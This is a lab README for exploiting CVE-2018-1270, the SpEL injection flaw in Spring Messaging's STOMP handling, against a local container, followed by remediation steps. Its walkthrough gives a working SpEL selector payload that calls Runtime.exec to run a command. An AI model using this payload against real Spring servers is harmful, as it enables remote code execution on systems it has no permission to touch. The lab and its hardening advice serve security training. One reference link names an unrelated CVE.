# Spring Messaging STOMP Protocol SpEL Remote Code Execution (CVE-2018-1270)

## Overview

Spring Framework versions 5.0 to 5.0.4 and 4.3 to 4.3.14 contain a critical vulnerability in the spring-messaging module. When applications use STOMP over WebSocket with simple in-memory brokers, clients can establish subscriptions containing custom selector headers. The selector expressions are parsed and evaluated as Spring Expression Language (SpEL) expressions, allowing unauthenticated attackers to execute arbitrary system commands.

- **Service Access**: `http://localhost:8151/`
- **Default Credentials**: `Unauthenticated STOMP client`
- **Docker Shortcut**: `./lab start spring-messaging-rce`
- **Container Name**: `cyberlab_04_spring_messaging_rce`
- **RAM Footprint**: ~450M

---

## Exploitation Walkthrough

### 1. Connect via WebSocket STOMP

```bash
# Establish websocket handshake to ws://localhost:8151/gs-guide-websocket
```

### 2. Submit SUBSCRIBE Frame with SpEL Selector

```bash
SEND SUBSCRIBE frame with selector: T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned_spring_msg')
```

### 3. Verify Command Execution

```bash
docker exec -it cyberlab_04_spring_messaging_rce ls -la /tmp/pwned_spring_msg
```

---

## Defensive Remediation & Hardening

1. Upgrade Spring Framework to version 5.0.5 or 4.3.15 or higher.
2. Sanitize and validate incoming STOMP headers before evaluation.
3. Use external enterprise message brokers (e.g. RabbitMQ or ActiveMQ) with hardened selectors.

---

## Video Walkthroughs & Technical References

- [#spring cloud gateway remote code execution | CVE-2022-22947](https://www.youtube.com/watch?v=mX3MtC6psJA)
- [VMware Spring Security Advisory CVE-2018-1270](https://spring.io/security/cve-2018-1270)
- [Vulhub Spring Messaging Environment](https://vulhub.org/#/environments/spring/CVE-2018-1270/)
